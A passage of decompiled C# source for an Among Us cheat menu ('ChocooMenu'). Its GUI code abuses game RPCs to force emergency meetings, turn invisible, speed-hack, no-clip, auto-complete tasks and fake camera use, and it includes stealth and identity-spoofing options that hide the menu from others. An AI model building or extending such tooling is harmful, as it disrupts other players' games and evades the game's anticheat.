          ((Color) ref color).\u002Ector(0.3f, 0.15f, 0.45f, 1f);
        }
      }
      else
      {
        // ISSUE: explicit constructor call
        ((Color) ref color).\u002Ector(0.2f, 0.2f, 0.2f, 1f);
      }
      GUI.backgroundColor = color;
      GUI.Box(rect, "", GUI.skin.box);
      GUI.Label(rect, label, new GUIStyle(GUI.skin.label)
      {
        alignment = (TextAnchor) 4,
        fontStyle = (FontStyle) 1,
        normal = {
          textColor = !isActive ? (!flag1 ? new Color(0.7f, 0.7f, 0.7f, 1f) : new Color(0.9f, 0.9f, 0.9f, 1f)) : Color.white
        }
      });
      bool flag2 = GUI.Button(rect, "", GUIStyle.none);
      if (flag2 && ChocooPlugin.ActiveTab != label)
      {
        this.targetTab = label;
        this.tabTransitionProgress = 0.0f;
      }
      GUI.backgroundColor = backgroundColor;
      return flag2;
    }

    private void DrawMainContent()
    {
      float num1 = 110f + this.contentOffset.x;
      float num2 = 50f + this.contentOffset.y;
      float num3 = ((Rect) ref this.windowRect).width - 120f;
      float num4 = ((Rect) ref this.windowRect).height - 90f;
      Color color = GUI.color;
      GUI.color = new Color(1f, 1f, 1f, this.tabTransitionProgress);
      GUILayout.BeginArea(new Rect(num1, num2, num3, num4));
      if (ChocooPlugin.ActiveTab == "About")
        this.DrawAboutTab();
      else if (ChocooPlugin.ActiveTab == "Game")
        this.DrawGameTab();
      else if (ChocooPlugin.ActiveTab == "Self")
        this.DrawSelfTab();
      else if (ChocooPlugin.ActiveTab == "Settings")
        this.DrawCustomisationsTab();
      else if (ChocooPlugin.ActiveTab == "Map")
        this.DrawMapTab();
      else if (ChocooPlugin.ActiveTab == "Roles")
        this.DrawRolesTab();
      else if (ChocooPlugin.ActiveTab == "Sabotages")
        this.DrawSabotagesTab();
      else if (ChocooPlugin.ActiveTab == "Host")
        this.DrawHostTab();
      else if (ChocooPlugin.ActiveTab == "Players")
        this.DrawVotekickTab();
      else if (ChocooPlugin.ActiveTab == "Destruct")
        this.DrawDestructTab();
      else if (ChocooPlugin.ActiveTab == "No Dating")
        this.DrawNoDatingTab();
      else if (ChocooPlugin.ActiveTab == "Chat")
        this.DrawChatTab();
      else if (ChocooPlugin.ActiveTab == "Chat")
        this.DrawChatTab();
      else if (ChocooPlugin.ActiveTab == "Anticheat")
        this.DrawAnticheatTab();
      GUILayout.EndArea();
      GUI.color = color;
    }

    private void DrawAboutTab()
    {
      bool spoofMenuDropdown = this.showSpoofMenuDropdown;
      if (spoofMenuDropdown)
        this.aboutScrollPosition = GUILayout.BeginScrollView(this.aboutScrollPosition, false, true, GUIStyle.none, GUI.skin.verticalScrollbar, Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(0.6f, 0.2f, 1f);
      GUILayout.Label("Welcome!", new GUIStyle(GUI.skin.label)
      {
        fontSize = 14,
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(10f);
      GUIStyle guiStyle = new GUIStyle(GUI.skin.label)
      {
        wordWrap = true,
        fontSize = 12
      };
      GUILayout.Label("Thank you for trying out my menu!", guiStyle, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Space(8f);
      GUILayout.Label("Don't share this menu with anyone else.", guiStyle, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Space(8f);
      GUILayout.Label("I will add more features later, so stay tuned!", guiStyle, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Space(8f);
      GUILayout.Label("Enjoy cheating responsibly.", guiStyle, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Space(15f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(0.6f, 0.2f, 1f);
      GUILayout.Label("Visual Settings", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      this.DrawToggleSwitch("RGB Mode", ref ChocooPlugin.RGBMode);
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(10f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(0.6f, 0.2f, 1f);
      GUILayout.Label("Menu Settings", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("Menu Hotkey:", new GUILayoutOption[1]
      {
        GUILayout.Width(100f)
      });
      GUI.backgroundColor = ChocooPlugin.isChangingKey ? new Color(1f, 0.5f, 0.0f, 1f) : new Color(0.3f, 0.3f, 0.4f, 1f);
      if (GUILayout.Button(ChocooPlugin.isChangingKey ? "Press any key..." : ChocooPlugin.MenuKey.Value.ToString(), new GUILayoutOption[1]
      {
        GUILayout.Height(25f)
      }))
        ChocooPlugin.isChangingKey = true;
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.EndHorizontal();
      if (ChocooPlugin.isChangingKey)
      {
        GUI.contentColor = Color.yellow;
        GUILayout.Label("Waiting for key press...", new GUIStyle(GUI.skin.label)
        {
          fontSize = 10,
          alignment = (TextAnchor) 4
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = ChocooPlugin.GetRGBText();
      }
      GUILayout.Space(10f);
      bool stealthMode = ChocooPlugin.StealthMode;
      this.DrawToggleSwitch("Hide Menu Usage to Others", ref ChocooPlugin.StealthMode);
      if (stealthMode != ChocooPlugin.StealthMode)
        DiscordRichPresencePatch.ForceDiscordUpdate();
      if (stealthMode != ChocooPlugin.StealthMode)
      {
        if (ChocooPlugin.StealthMode)
          ChocooPlugin.Logger.LogInfo((object) "[ChocooMenu] \uD83D\uDD12 STEALTH MODE ENABLED - Menu is now hidden");
        else
          ChocooPlugin.Logger.LogInfo((object) "[ChocooMenu] \uD83D\uDCE1 STEALTH MODE DISABLED - Now broadcasting RPC 121");
      }
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(10f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(1f, 0.5f, 0.2f);
      GUILayout.Label("\uD83C\uDFAD Spoof Menu Usage", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      bool spoofMenuEnabled = ChocooPlugin.SpoofMenuEnabled;
      this.DrawToggleSwitch("Spoof Menu Identity", ref ChocooPlugin.SpoofMenuEnabled);
      if (spoofMenuEnabled != ChocooPlugin.SpoofMenuEnabled)
        DiscordRichPresencePatch.ForceDiscordUpdate();
      if (ChocooPlugin.SpoofMenuEnabled)
      {
        GUILayout.Space(5f);
        GUI.contentColor = Color.yellow;
        GUILayout.Label("Select Menu to Impersonate:", new GUIStyle(GUI.skin.label)
        {
          fontStyle = (FontStyle) 1,
          fontSize = 10
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = ChocooPlugin.GetRGBText();
        GUILayout.Space(3f);
        GUI.backgroundColor = new Color(0.3f, 0.3f, 0.4f, 1f);
        if (GUILayout.Button("▼ " + ChocooPlugin.spoofMenuNames[ChocooPlugin.selectedSpoofMenuIndex], new GUILayoutOption[1]
        {
          GUILayout.Height(30f)
        }))
        {
          this.showSpoofMenuDropdown = !this.showSpoofMenuDropdown;
          if (this.showSpoofMenuDropdown)
          {
            this.aboutScrollPosition = Vector2.zero;
            this.spoofMenuDropdownScrollPosition = Vector2.zero;
          }
        }
        GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
        float dropdownHeight = this.GetDropdownHeight("spoofMenu", this.showSpoofMenuDropdown, 150f);
        if ((double) dropdownHeight > 1.0)
        {
          GUILayout.Space(5f);
          GUI.backgroundColor = new Color(0.2f, 0.2f, 0.2f);
          GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
          this.spoofMenuDropdownScrollPosition = GUILayout.BeginScrollView(this.spoofMenuDropdownScrollPosition, new GUILayoutOption[1]
          {
            GUILayout.Height(dropdownHeight)
          });
          for (int index = 0; index < ChocooPlugin.spoofMenuNames.Length; ++index)
          {
            GUI.backgroundColor = ChocooPlugin.selectedSpoofMenuIndex == index ? new Color(1f, 0.5f, 0.2f, 1f) : new Color(0.25f, 0.25f, 0.25f, 1f);
            if (GUILayout.Button(ChocooPlugin.spoofMenuNames[index], new GUILayoutOption[1]
            {
              GUILayout.Height(25f)
            }))
            {
              ChocooPlugin.selectedSpoofMenuIndex = index;
              ChocooPlugin.Config_SpoofMenuIndex.Value = index;
              this.showSpoofMenuDropdown = false;
              ChocooPlugin.Logger.LogInfo((object) $"Spoof menu changed to: {ChocooPlugin.spoofMenuNames[index]} (RPC {ChocooPlugin.spoofMenuRPCs[index].ToString()})");
            }
          }
          GUI.backgroundColor = ChocooPlugin.GetRGBColor();
          GUILayout.EndScrollView();
          GUILayout.EndVertical();
        }
        GUILayout.Space(5f);
        GUI.backgroundColor = new Color(0.2f, 0.2f, 0.2f, 0.9f);
        GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
        GUI.contentColor = Color.cyan;
        GUILayout.Label("ℹ️ Currently Broadcasting As:", new GUIStyle(GUI.skin.label)
        {
          fontSize = 9,
          fontStyle = (FontStyle) 1
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = new Color(1f, 0.8f, 0.3f);
        GUILayout.Label(ChocooPlugin.spoofMenuNames[ChocooPlugin.selectedSpoofMenuIndex], new GUIStyle(GUI.skin.label)
        {
          fontSize = 10,
          alignment = (TextAnchor) 4
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = Color.gray;
        GUILayout.Label("RPC ID: " + ChocooPlugin.spoofMenuRPCs[ChocooPlugin.selectedSpoofMenuIndex].ToString(), new GUIStyle(GUI.skin.label)
        {
          fontSize = 8,
          alignment = (TextAnchor) 4
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = ChocooPlugin.GetRGBText();
        GUILayout.EndVertical();
        GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      }
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(5f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(0.6f, 0.2f, 1f);
      GUILayout.Label("Credits", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1,
        alignment = (TextAnchor) 4
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(2f);
      GUILayout.Label("Created by chocoo21", new GUIStyle(GUI.skin.label)
      {
        alignment = (TextAnchor) 4,
        fontSize = 11
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("Testing and Ideator - A L I & Metox", new GUIStyle(GUI.skin.label)
      {
        alignment = (TextAnchor) 4,
        fontSize = 10
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("Contributions - TuffMenu │ Bug Hunter - Kuchi,Cool Cat", new GUIStyle(GUI.skin.label)
      {
        alignment = (TextAnchor) 4,
        fontSize = 10
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUI.contentColor = Color.white;
      if (!spoofMenuDropdown)
        return;
      GUILayout.EndScrollView();
    }

    private void SpawnDummies(int count)
    {
      try
      {
        if (!((InnerNetClient) AmongUsClient.Instance).AmHost)
        {
          ChocooPlugin.Logger.LogWarning((object) "Must be host to spawn dummies");
          if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
            return;
          DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Cannot spawn dummies without host!");
        }
        else if (Object.op_Equality((Object) PlayerControl.LocalPlayer, (Object) null))
        {
          ChocooPlugin.Logger.LogWarning((object) "Local player is null");
        }
        else
        {
          int num = 0;
          for (int index = 0; index < count; ++index)
          {
            if (CloneMgr.AddOf(PlayerControl.LocalPlayer) != -1)
              ++num;
          }
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Spawn dummies error: " + ex.Message));
      }
    }

    private void RemoveAllDummies()
    {
      try
      {
        if (!((InnerNetClient) AmongUsClient.Instance).AmHost)
        {
          ChocooPlugin.Logger.LogWarning((object) "Must be host to remove dummies");
          if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
            return;
          DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Cannot remove dummies without host!");
        }
        else
        {
          int count = CloneMgr.L.Count;
          CloneMgr.Clear();
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Remove all dummies error: " + ex.Message));
      }
    }

    private void DrawGameTab()
    {
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(0.3f, 0.8f, 1f);
      GUILayout.Label("Game Controls", new GUIStyle(GUI.skin.label)
      {
        fontSize = 14,
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(10f);
      this.scrollPosition = GUILayout.BeginScrollView(this.scrollPosition, false, true, GUIStyle.none, GUI.skin.verticalScrollbar, Array.Empty<GUILayoutOption>());
      GUI.backgroundColor = new Color(0.3f, 0.3f, 0.3f, 1f);
      if (GUILayout.Button("FORCE EMERGENCY", new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
        this.ExecuteEmergencyRPC();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(5f);
      GUI.backgroundColor = new Color(0.3f, 0.3f, 0.3f, 1f);
      if (GUILayout.Button("END MEETING (CLIENT)", new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
        this.EndMeetingClientSided();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(5f);
      GUI.backgroundColor = !ChocooPlugin.InvisibilityEnabled ? new Color(0.3f, 0.3f, 0.3f, 1f) : new Color(0.2f, 0.8f, 0.2f, 1f);
      if (GUILayout.Button(ChocooPlugin.InvisibilityEnabled ? "STOP INVISIBILITY" : "BECOME INVISIBLE", new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
      {
        ChocooPlugin.InvisibilityEnabled = !ChocooPlugin.InvisibilityEnabled;
        ChocooPlugin.ToggleInvisibility();
      }
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(5f);
      GUI.backgroundColor = new Color(0.3f, 0.3f, 0.3f, 1f);
      if (GUILayout.Button("KICK ALL FROM VENTS", new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
      {
        try
        {
          if (Object.op_Inequality((Object) ShipStatus.Instance, (Object) null))
          {
            foreach (Vent allVent in (Il2CppArrayBase<Vent>) ShipStatus.Instance.AllVents)
              VentilationSystem.Update((VentilationSystem.Operation) 5, allVent.Id);
          }
        }
        catch (Exception ex)
        {
          ChocooPlugin.Logger.LogError((object) ("KickVents error: " + ex.Message));
        }
      }
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(5f);
      GUI.backgroundColor = new Color(0.3f, 0.3f, 0.3f, 1f);
      if (GUILayout.Button("RANDOMIZE OUTFIT", new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
      {
        try
        {
          HatManager instance = DestroyableSingleton<HatManager>.Instance;
          if (Object.op_Inequality((Object) instance, (Object) null))
          {
            Random random = new Random();
            if (((InnerNetClient) AmongUsClient.Instance).AmConnected)
            {
              PlayerControl.LocalPlayer.CmdCheckColor((byte) random.Next(0, 15));
              PlayerControl.LocalPlayer.RpcSetHat(((CosmeticData) ((Il2CppArrayBase<HatData>) instance.allHats)[random.Next(0, ((Il2CppArrayBase<HatData>) instance.allHats).Length)]).ProductId);
              PlayerControl.LocalPlayer.RpcSetVisor(((CosmeticData) ((Il2CppArrayBase<VisorData>) instance.allVisors)[random.Next(0, ((Il2CppArrayBase<VisorData>) instance.allVisors).Length)]).ProductId);
              PlayerControl.LocalPlayer.RpcSetSkin(((CosmeticData) ((Il2CppArrayBase<SkinData>) instance.allSkins)[random.Next(0, ((Il2CppArrayBase<SkinData>) instance.allSkins).Length)]).ProductId);
              PlayerControl.LocalPlayer.RpcSetPet(((CosmeticData) ((Il2CppArrayBase<PetData>) instance.allPets)[random.Next(0, ((Il2CppArrayBase<PetData>) instance.allPets).Length)]).ProductId);
            }
            else
            {
              DestroyableSingleton<AccountManager>.Instance.RandomizeName();
              PlayerCustomization.EquipSkin(((Il2CppArrayBase<SkinData>) instance.allSkins)[random.Next(0, ((Il2CppArrayBase<SkinData>) instance.allSkins).Length)]);
              PlayerCustomization.EquipHat(((Il2CppArrayBase<HatData>) instance.allHats)[random.Next(0, ((Il2CppArrayBase<HatData>) instance.allHats).Length)]);
              PlayerCustomization.EquipVisor(((Il2CppArrayBase<VisorData>) instance.allVisors)[random.Next(0, ((Il2CppArrayBase<VisorData>) instance.allVisors).Length)]);
              PlayerCustomization.EquipPet(((Il2CppArrayBase<PetData>) instance.allPets)[random.Next(0, ((Il2CppArrayBase<PetData>) instance.allPets).Length)]);
              PlayerCustomization.EquipNameplate(((Il2CppArrayBase<NamePlateData>) instance.allNamePlates)[random.Next(0, ((Il2CppArrayBase<NamePlateData>) instance.allNamePlates).Length)]);
            }
          }
        }
        catch (Exception ex)
        {
          ChocooPlugin.Logger.LogError((object) ("RandomizeOutfit error: " + ex.Message));
        }
      }
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(5f);
      GUI.backgroundColor = new Color(0.3f, 0.3f, 0.3f, 1f);
      if (GUILayout.Button("COMPLETE ALL TASKS", new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
        this.CompleteAllTasks();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(10f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(1f, 0.8f, 0.3f);
      GUILayout.Label("Game Speed", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      string str1 = (double) ChocooPlugin.GameSpeed == 1.0 ? "1x (Normal)" : ChocooPlugin.GameSpeed.ToString("F1") + "x";
      GUI.contentColor = (double) ChocooPlugin.GameSpeed < 1.0 ? Color.cyan : ((double) ChocooPlugin.GameSpeed > 1.0 ? Color.yellow : Color.green);
      GUILayout.Label(str1, new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1,
        fontSize = 13,
        alignment = (TextAnchor) 4
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      Color backgroundColor1 = GUI.backgroundColor;
      GUI.backgroundColor = Color.white;
      ChocooPlugin.GameSpeed = GUILayout.HorizontalSlider(ChocooPlugin.GameSpeed, 0.2f, 3f, Array.Empty<GUILayoutOption>());
      ChocooPlugin.Config_GameSpeed.Value = ChocooPlugin.GameSpeed;
      GUI.backgroundColor = backgroundColor1;
      if ((double) Mathf.Abs(ChocooPlugin.GameSpeed - 1f) < 0.05000000074505806)
        ChocooPlugin.GameSpeed = 1f;
      GUILayout.Space(5f);
      GUI.backgroundColor = new Color(0.4f, 0.4f, 0.4f, 1f);
      if (GUILayout.Button("RESET TO NORMAL", new GUILayoutOption[1]
      {
        GUILayout.Height(28f)
      }))
        ChocooPlugin.GameSpeed = 1f;
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(10f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(0.3f, 1f, 0.8f);
      GUILayout.Label("Player Speed", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      this.DrawToggleSwitch("SpeedHack", ref ChocooPlugin.SpeedHackEnabled);
      GUILayout.Space(5f);
      if (ChocooPlugin.SpeedHackEnabled)
      {
        string str2 = (double) ChocooPlugin.PlayerSpeed == 1.0 ? "1x (Normal)" : ChocooPlugin.PlayerSpeed.ToString("F1") + "x";
        GUI.contentColor = (double) ChocooPlugin.PlayerSpeed < 1.0 ? Color.cyan : ((double) ChocooPlugin.PlayerSpeed > 1.0 ? Color.yellow : Color.green);
        GUILayout.Label(str2, new GUIStyle(GUI.skin.label)
        {
          fontStyle = (FontStyle) 1,
          fontSize = 13,
          alignment = (TextAnchor) 4
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = ChocooPlugin.GetRGBText();
        GUILayout.Space(5f);
        Color backgroundColor2 = GUI.backgroundColor;
        GUI.backgroundColor = Color.white;
        ChocooPlugin.PlayerSpeed = GUILayout.HorizontalSlider(ChocooPlugin.PlayerSpeed, 0.1f, 50f, Array.Empty<GUILayoutOption>());
        ChocooPlugin.Config_PlayerSpeed.Value = ChocooPlugin.PlayerSpeed;
        GUI.backgroundColor = backgroundColor2;
        if ((double) Mathf.Abs(ChocooPlugin.PlayerSpeed - 1f) < 0.05000000074505806)
          ChocooPlugin.PlayerSpeed = 1f;
        GUILayout.Space(5f);
        GUI.backgroundColor = new Color(0.4f, 0.4f, 0.4f, 1f);
        if (GUILayout.Button("RESET TO NORMAL", new GUILayoutOption[1]
        {
          GUILayout.Height(28f)
        }))
        {
          ChocooPlugin.PlayerSpeed = 1f;
          if (Object.op_Inequality((Object) PlayerControl.LocalPlayer, (Object) null))
            PlayerControl.LocalPlayer.MyPhysics.Speed = 1f;
        }
        GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      }
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(10f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(1f, 0.8f, 0.3f);
      GUILayout.Label("Animations", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      string str3 = ChocooPlugin.IsScanning ? "SCANNING - STOP" : "SET SCANNER";
      GUI.backgroundColor = ChocooPlugin.IsScanning ? new Color(0.2f, 0.6f, 0.2f, 1f) : new Color(0.3f, 0.3f, 0.3f, 1f);
      if (GUILayout.Button(str3, new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
      {
        ChocooPlugin.IsScanning = !ChocooPlugin.IsScanning;
        this.SendServerScan(ChocooPlugin.IsScanning);
      }
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(3f);
      string str4 = ChocooPlugin.AnimShieldsEnabled ? "SHIELDS - STOP" : "PLAY SHIELDS ANIM";
      GUI.backgroundColor = ChocooPlugin.AnimShieldsEnabled ? new Color(0.2f, 0.6f, 0.2f, 1f) : new Color(0.3f, 0.3f, 0.3f, 1f);
      if (GUILayout.Button(str4, new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
      {
        ChocooPlugin.AnimShieldsEnabled = !ChocooPlugin.AnimShieldsEnabled;
        if (ChocooPlugin.AnimShieldsEnabled)
          this.ForcePlayAnimation((byte) 1);
        else
          ChocooPlugin.AnimShieldsEnabled = false;
      }
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(3f);
      string str5 = ChocooPlugin.AnimAsteroidsEnabled ? "ASTEROIDS - STOP" : "PLAY ASTEROIDS";
      GUI.backgroundColor = ChocooPlugin.AnimAsteroidsEnabled ? new Color(0.2f, 0.6f, 0.2f, 1f) : new Color(0.3f, 0.3f, 0.3f, 1f);
      if (GUILayout.Button(str5, new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
        ChocooPlugin.AnimAsteroidsEnabled = !ChocooPlugin.AnimAsteroidsEnabled;
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(3f);
      string str6 = ChocooPlugin.AnimEmptyGarbageEnabled ? "GARBAGE - STOP" : "EMPTY GARBAGE";
      GUI.backgroundColor = ChocooPlugin.AnimEmptyGarbageEnabled ? new Color(0.2f, 0.6f, 0.2f, 1f) : new Color(0.3f, 0.3f, 0.3f, 1f);
      if (GUILayout.Button(str6, new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
      {
        ChocooPlugin.AnimEmptyGarbageEnabled = !ChocooPlugin.AnimEmptyGarbageEnabled;
        if (ChocooPlugin.AnimEmptyGarbageEnabled)
          this.ForcePlayAnimation((byte) 10);
        else
          ChocooPlugin.AnimEmptyGarbageEnabled = false;
      }
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(3f);
      string str7 = ChocooPlugin.AnimCamsInUseEnabled ? "CAMS IN USE - STOP" : "FAKE CAMS IN USE";
      GUI.backgroundColor = ChocooPlugin.AnimCamsInUseEnabled ? new Color(0.2f, 0.6f, 0.2f, 1f) : new Color(0.3f, 0.3f, 0.3f, 1f);
      if (GUILayout.Button(str7, new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
      {
        ChocooPlugin.AnimCamsInUseEnabled = !ChocooPlugin.AnimCamsInUseEnabled;
        try
        {
          if (Object.op_Inequality((Object) ShipStatus.Instance, (Object) null))
            ShipStatus.Instance.RpcUpdateSystem((SystemTypes) 11, ChocooPlugin.AnimCamsInUseEnabled ? (byte) 1 : (byte) 0);
        }
        catch (Exception ex)
        {
          ChocooPlugin.Logger.LogError((object) ("Fake Cams error: " + ex.Message));
        }
      }
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(10f);
      GUILayout.EndScrollView();
    }

    private void DrawSelfTab()
    {
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(0.3f, 1f, 0.5f);
      GUILayout.Label("Self Features", new GUIStyle(GUI.skin.label)
      {
        fontSize = 14,
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(10f);
      this.selfScrollPosition = GUILayout.BeginScrollView(this.selfScrollPosition, false, true, GUIStyle.none, GUI.skin.verticalScrollbar, Array.Empty<GUILayoutOption>());
      this.DrawToggleSwitch("See Kill Cooldown", ref ChocooPlugin.ShowKillCooldown);
      this.DrawToggleSwitch("Kill Notification", ref ChocooPlugin.KillNotificationEnabled);
      this.DrawToggleSwitch("Show Player Info", ref ChocooPlugin.ShowPlayerInfo);
      this.DrawToggleSwitch("Show Votekick Info", ref ChocooPlugin.ShowVotekickInfo);
      this.DrawToggleSwitch("Show Votekick Counter", ref ChocooPlugin.ShowVotekickCounter);
      this.DrawToggleSwitch("No Clip", ref ChocooPlugin.NoClipEnabled);
      this.DrawToggleSwitch("Spin (Client)", ref ChocooPlugin.SpinEnabled);
      this.DrawToggleSwitch("Anti-Exploits", ref ChocooPlugin.AntiExploitsEnabled);
      this.DrawToggleSwitch("Anti-Blackout", ref ChocooPlugin.AntiBlackoutEnabled);
      this.DrawToggleSwitch("Auto Rejoin on Game End", ref ChocooPlugin.AutoRejoinEnabled);
      this.DrawToggleSwitch("Accurate Disconnect Reasons", ref ChocooPlugin.AccurateDisconnectReasonsEnabled);
